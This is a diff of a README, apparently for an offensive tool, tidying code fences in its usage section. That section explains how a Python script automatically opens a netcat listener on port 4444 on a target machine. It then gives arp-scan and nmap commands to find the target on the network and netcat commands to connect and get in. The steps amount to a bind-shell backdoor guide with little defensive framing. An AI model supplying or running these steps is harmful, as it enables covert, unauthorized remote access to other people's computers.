@@ -56,15 +56,18 @@ This tool is designed to:
 - **On target machine (Runs automatically with python script)**.
    ```bash
    nc64 -lvp 4444
+   ```
    
 - **Attacker's Machine**.
   - **For Linux**
     ```bash
     nc <ip_address_of _the_target_machine> 4444
+    ```
   
   - **For Windows**
     ```bash
     nc64 <ip_address_of _the_target_machine> 4444
+    ```
     
    - For windows users, you can download `netcat` tool from [this repository](https://github.com/int0x33/nc.exe/)
    - In Linux, the netcat comes preinstalled.
@@ -78,17 +81,22 @@ This tool is designed to:
    - **For Windows**
      ```bash
      arp -a
-   
+     ```
+     
    - **For Linux**
      ```bash
      sudo arp-scan --localnet
+     ```
      
    This will list all the IP addresses in a network and we have to find our target from this which can simply be done by an nmap scan
    
    ```bash
    nmap -p 4444 <ip_address>
    ```
-   If we find the port number 4444 open for any IP address, it maybe our target machine. Just try to connect using the netcat command if its successful the we're in the machine.
+
+  If port 4444 is open on any IP address, it may be our target machine.
+
+  Try connecting using the Netcat command — if it’s successful, you're in.
 
 
 6. Enjoy responsibly (or face karmic doom).
